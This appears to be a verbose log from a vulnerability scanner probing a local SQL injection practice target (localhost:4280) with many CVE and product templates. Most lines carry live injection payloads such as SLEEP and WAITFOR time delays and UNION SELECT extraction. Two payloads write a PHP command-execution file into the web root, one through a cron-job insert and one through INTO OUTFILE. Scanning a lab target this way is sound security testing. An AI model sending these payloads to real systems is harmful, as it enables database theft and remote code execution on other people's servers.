+[VER] [CVE-2024-1071] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&p=1
+[VER] [CVE-2025-6403] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/student.php?id=1&id=1&id=1'+AND+SLEEP(7)--+-&Submit=Submit&Submit=Submit&action=delete
+[WRN] [CVE-2024-1071] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[VER] [CVE-2024-29889] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&noAUTO=1
+[VER] [CVE-2025-6970] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-57819] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'%20;INSERT%20INTO%20cron_jobs%20(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)%20VALUES%20('sysadmin','qtybpl','echo%20%22PD9waHAgaGVhZGVyKCd4X3BvYzogQ1ZFLTIwMjUtNTc4MTknKTsgZWNobyBzaGVsbF9leGVjKCd1bmFtZSAtYScpOyB1bmxpbmsoX19GSUxFX18pOyA/Pgo=%22%7Cbase64%20-d%20%3E/var/www/html/wqmjq.php',NULL,'*%20*%20*%20*%20*',30,1,1)%20--%20
+[VER] [CVE-2024-3495] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-32128] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&wpl_format=f:property_listing:ajax&wpl_function=get_total_results&sf_tmin_price=1
+[WRN] [CVE-2024-3495] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[VER] [CVE-2026-21643] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/init_consts?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-9744] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&action=login
+[VER] [CVE-2026-2413] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/x'OR(EXP(~(SELECT*FROM(SELECT(SLEEP(8)))a)))OR'/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-1581] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/community/recent/?id=1&id=1&Submit=Submit&Submit=Submit&wpfob=(SELECT/**/1/**/FROM/**/(SELECT/**/SLEEP(8))a)
+[VER] [CVE-2025-7160] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-8868] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v0/compliance/profiles/search?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-21643] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/init_consts?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-2416] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/geo-mashup/readme.txt?id=1&Submit=Submit
+[WRN] [CVE-2026-41640] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2024-36683] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-40887] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/shop-api?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-34885] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/media-library-assistant/readme.txt?id=1&Submit=Submit
+[VER] [CVE-2024-38773] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-41640] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/app:getInfo?id=1&Submit=Submit
+[VER] [CVE-2024-4295] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [CVE-2026-41641] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/app:getInfo?id=1&Submit=Submit
+[VER] [CVE-2026-3396] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wc-ajax-product-filter/readme.txt?id=1&Submit=Submit
+[VER] [CVE-2024-43144] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [74cms-weixin-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/plus/weixin.php?id=1&id=1&Submit=Submit&Submit=Submit&signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp&nonce
+[VER] [CVE-2026-42031] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/action/status_show?id=1&Submit=Submit
+[VER] [CVE-2026-9082] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jsonapi/node/article?id=1&id=1&Submit=Submit&Submit=Submit&filter[t][condition][path]=title&filter[t][condition][operator]=IN&filter[t][condition][value][%60]=x
+[VER] [CVE-2024-4434] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-43917] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&p=1
+[WRN] [CVE-2024-4434] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[VER] [esafenet-netsecconfigajax-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/CDGServer3/NetSecConfigAjax;Service?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-4295] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/email-subscribers/readme.txt?id=1&Submit=Submit
+[VER] [CVE-2026-9082] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jsonapi/node/page?id=1&id=1&Submit=Submit&Submit=Submit&filter[t][condition][path]=title&filter[t][condition][operator]=IN&filter[t][condition][value][%60]=x
+[VER] [huatian-oa-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/OAapp/bfapp/buffalo/workFlowService?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [hjsoft-hcm-tb-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/w_selfservice/oauthservlet/../../gz/LoadOtherTreeServlet?id=1&id=1&Submit=Submit&Submit=Submit&modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A6%27--&flag=1
+[VER] [hjsoft-hcm-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/w_selfservice/oauthservlet/../../servlet/sduty/getSdutyTree?id=1&id=1&Submit=Submit&Submit=Submit&param=child&target=1&codesetid=1&codeitemid=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28119%29%2BCHAR%2885%29%2BCHAR%2873%29%2BCHAR%2887%29%2BCHAR%2899%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%28113%29%2BCHAR%28104%29%2BCHAR%28107%29%2BCHAR%2889%29%2BCHAR%28115%29%2BCHAR%28108%29%2BCHAR%2873%29%2BCHAR%2884%29%2BCHAR%2869%29%2BCHAR%2873%29%2BCHAR%2875%29%2BCHAR%2883%29%2BCHAR%2898%29%2BCHAR%28116%29%2BCHAR%28120%29%2BCHAR%2889%29%2BCHAR%2884%29%2BCHAR%2882%29%2BCHAR%28120%29%2BCHAR%2884%29%2BCHAR%28116%29%2BCHAR%2888%29%2BCHAR%28112%29%2BCHAR%2887%29%2BCHAR%2873%29%2BCHAR%28109%29%2BCHAR%28104%29%2BCHAR%2887%29%2BCHAR%28102%29%2BCHAR%2897%29%2BCHAR%2877%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL--+Iprd
+[VER] [esafenet-noticeajax-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/CDGServer3/NoticeAjax;Service?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [finereport-sqli-rce] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/webroot/decision/view/ReportServer?id=1&id=1&Submit=Submit&Submit=Submit&acabcbcc&n=${sum(1024,123)}
+[VER] [CVE-2024-48259] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php/oqrs/request_form?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6205] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&wc-api=payplus_gateway&status_code=true&more_info=(select*from(select(sleep(6)))a)
+[VER] [CVE-2024-51482] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-5765] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-6433] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-8484] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-7854] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6928] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6924] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-52694] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [CVE-2025-24799] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php/ajax/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-2473] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [fumengyun-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-9744] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&page=home
+[VER] [jinhe-jc6-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jc6/servlet/clobfield?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [erensoft-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/videoseyret.php?id=1&id=1&id=95%20AND%20(SELECT%204581%20FROM%20(SELECT(SLEEP(6)))NyiX)&Submit=Submit&Submit=Submit
+[VER] [applezeed-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/travel-detail.php?id=1&id=1&id=1%27AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))bAKL)%20AND%20%27vRxe%27=%27vRxe&Submit=Submit&Submit=Submit
+[VER] [enjoyrmis-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/EnjoyRMIS_WS/WS/POS/cwsoa.asmx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-46670] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&BazaR&vue=formulaire
+[VER] [CVE-2026-9082] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/user/login?id=1&id=1&Submit=Submit&Submit=Submit&_format=json
+[VER] [aspcms-commentlist-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/plug/comment/commentList.asp?id=1&id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user&Submit=Submit
+[VER] [azon-dominator-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/fetch_products.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2026-26980] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[WRN] [CVE-2026-41641] Could not execute step on http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: cause="No parameter 'username' found." chain="could not evaluate helper expressions; failed to execute http:1 protocol; got following errors while executing flow"
+[VER] [chamilo-lms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/main/inc/ajax/extra_field.ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&a=search_options_from_tags
+[VER] [castel-digital-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/restrito/login/sub/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [cloud-oa-system-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/OA/PM/svc.asmx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [ecology-oa-file-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/weaver/weaver.file.FileDownloadForOutDoc?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [cpas-managment-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cpasm4/login?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [ecshop-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/user.php?id=1&id=1&Submit=Submit&Submit=Submit&act=login
+[VER] [csz-cms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/csz-cms/plugin/article/search?id=1&id=1&Submit=Submit&Submit=Submit&p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS
+[VER] [glodon-linkworks-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Org/service/Service.asmx/GetUserByEmployeeCode?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [groomify-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/blog-search?id=1&id=1&Submit=Submit&Submit=Submit&search=deneme%27%20AND%20(SELECT%201642%20FROM%20(SELECT(SLEEP(6)))Xppf)%20AND%20%27rszk%27=%27rszk
+[VER] [ems-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/process/aprocess.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [halo-tism-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/Notify?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [hongfan-ioffice-rce] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ioffice/prg/set/wss/ioAssistance.asmx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [hongfan-ioffice-rce] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ioffice/prg/set/wss/ioAssistance.asmx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [hongfan-ioffice-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/iOffice/prg/set/wss/udfmr.asmx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [huatian-oa8000-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/OAapp/bfapp/buffalo/workFlowService?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [phuket-cms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/properties-list.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [pingsheng-electronic-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [pmb-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/pmb/opac_css/ajax.php?id=1&id=1&id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(7)))SHde)&Submit=Submit&Submit=Submit&categ=storage&datetime=undefined&module=ajax&sub=save&token=undefined
+[WRN] [prest-sqli-auth-bypass] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: database
+[VER] [elgg-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [vpms-auth-bypass] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [user-management-system-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [yibao-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/system/ExecuteSqlForSingle?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [chamilo-lms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/main/inc/ajax/extra_field.ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&a=search_options_from_tags
+[VER] [xdcms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&m=member&f=login_save
+[VER] [readymade-unilevel-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/product-details.php?id=1&id=1&id=1%20AND%20(SELECT%206812%20FROM%20(SELECT(SLEEP(6)))DddL)&Submit=Submit&Submit=Submit
+[VER] [seeyon-oa-setextno-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?id=1&id=1&Submit=Submit&Submit=Submit&user_ids=(99999)+union+all+select+1,2,(md5(999999999)),4
+[VER] [stackposts-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/spre/auth/login?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [zhixiang-oa-msglog-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/mainpage/msglog.aspx?id=1&id=1&Submit=Submit&Submit=Submit&user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27127381%27))))--
+[VER] [tongda-insert-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/general/document/index.php/recv/register/insert?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [xhibiter-nft-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [simple-crm-sql-injection] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/scrm/crm/admin?id=1&Submit=Submit
+[VER] [ecshop-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/user.php?id=1&id=1&Submit=Submit&Submit=Submit&act=login
+[VER] [castel-digital-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/restrito/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [quick-cms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin.php?id=1&id=1&Submit=Submit&Submit=Submit&p=login
+[VER] [sitemap-sql-injection] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/sitemap.xml?id=1&id=1&Submit=Submit&Submit=Submit&offset=1;SELECT%20IF((SLEEP(6)),1,2356)
+[VER] [ecology-oa-file-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/weaver/weaver.file.FileDownloadForOutDoc?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [zms-auth-bypass] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/zms/admin/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [user-management-system-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/dashboard.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [prestashop-apmarketplace-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/m/apmarketplace/passwordrecovery?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [realor-gwt-system-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/AgentBoard.XGI?id=1&id=1&Submit=Submit&Submit=Submit&user='||'1&cmd=UserLogin
+[VER] [phuket-cms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/properties-list.php?id=1&id=1&Submit=Submit&Submit=Submit&property-types=%27
+[VER] [tongda-oa-swfupload-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/general/file_folder/swfupload_new.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [wp-autosuggest-sql-injection] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wp-autosuggest/autosuggest.php?id=1&id=1&Submit=Submit&Submit=Submit&wpas_action=query&wpas_keys=1%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5202%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%286%29%29%29yRVR%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dwQZ%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%27dwQZ
+[VER] [chanjet-tplus-checkmutex-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?id=1&id=1&Submit=Submit&Submit=Submit&method=CheckMutex
+[VER] [wp-smart-manager-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/smart-manager-for-wp-e-commerce/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [contus-video-gallery-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&image_id=123
+[VER] [notificationx-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [wp-adivaha-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/mobile-app/v3/?id=1&id=1&Submit=Submit&Submit=Submit&pid='+AND+(SELECT+6398+FROM+(SELECT(SLEEP(7)))zoQK)+AND+'Zbtn'='Zbtn&isMobile=chatbot
+[VER] [realor-gwt-system-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Board.XGI?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [indonasia-toko-cms-sql] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&mnu=login
+[VER] [tongda-insert-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/general/document/index.php/recv/register/insert?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [weaver-group-xml-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/inc/group_user_list/group_xml.php?id=1&id=1&Submit=Submit&Submit=Submit&par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgZWNobyBtZDUoIndlYXZlci1ncm91cC14bWwtc3FsaSIpO3VubGluayhfX0ZJTEVfXyk7Pz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290LzhremxuLnBocCdd
+[VER] [vbulletin-ajaxreg-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/&result=10
+[VER] [advanced-booking-calendar-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [weaver-e-cology-validate-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cpt/manage/validate.jsp?id=1&id=1&Submit=Submit&Submit=Submit&sourcestring=validateNum
+[VER] [wp-smart-manager-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/smart-manager-for-wp-e-commerce/sm/woo-json.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [tongda-report-func-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/general/bi_design/appcenter/report_bi.func.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] Sent TCP request to localhost:4280
+[VER] [opencart-core-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [wanhu-documentedit-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?id=1&id=1&Submit=Submit&Submit=Submit&DocumentID=1';WAITFOR%20DELAY%20'0:0:7'--
+[VER] [yonyou-u8-crm-tb-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/config/fillbacksetting.php?id=1&id=1&id=-99;WAITFOR+DELAY+'0:0:6'--&Submit=Submit&Submit=Submit&DontCheckLogin=1&action=delete
+[VER] [vbulletin-search-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/search.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [yonyou-u8-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/login.jsp?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [notificationx-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/notificationx/v1/notification/1?id=1&id=1&Submit=Submit&Submit=Submit&api_key=0afd1aba016d54f5435932c99fe44d6b&id[1]=%3d(SELECT/**/1/**/WHERE/**/SLEEP(6))
+[VER] Sent TCP request to localhost:4280
+[VER] could not read more data from localhost:4280: EOF
+[VER] [weaver-group-xml-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/8kzln.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [landray-eis-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/SM/rpt_listreport_definefield.aspx?id=1&Submit=Submit&ID=2%20and%201=@@version--+
+[VER] [yonyou-u8-crm-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/config/fillbacksettingedit.php?id=1&id=1&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+&Submit=Submit&Submit=Submit&DontCheckLogin=1&action=edit
+[VER] [wp-statistics-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wp-statistics/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-31974] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/?id=1&Submit=Submit&page=reports&date=2022-05-27%27%20union%20select%201,2,3,md5('999999999'),5,6,7,8,9,10--+
+[VER] [sound4-impact-auth-bypass] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [sitemap-sql-injection] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/sitemap.xml?id=1&id=1&Submit=Submit&Submit=Submit&offset=1;SELECT%20IF((SLEEP(16)),1,2356)
+[VER] [CVE-2018-8823] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/bamegamenu/ajax_phpcode.php?id=1&Submit=Submit&code=print(md5(999999999))
+[VER] [chanjet-tplus-ufida-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?id=1&id=1&Submit=Submit&Submit=Submit&method=CheckPassword
+[VER] [yonyou-grp-u8-xxe] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Proxy?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [yonyou-ufida-cloud-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ebvp/infopub/show_download_content;.js?id=1&id=1&id=1';WAITFOR+DELAY+'0:0:6'--&Submit=Submit&Submit=Submit
+[VER] [chanjet-gnremote-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/GNRemote.dll?id=1&id=1&Submit=Submit&Submit=Submit&GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl
+[VER] [CVE-2021-34187] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/main/inc/ajax/model.ajax.php?id=1&Submit=Submit&a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+md5(999999999))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0
+[VER] [CVE-2022-31975] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/?id=1&id=-6%27%20union%20select%201,md5('999999999'),3,4,5,6,7,8,9,10,11--+&Submit=Submit&page=user/manage_user
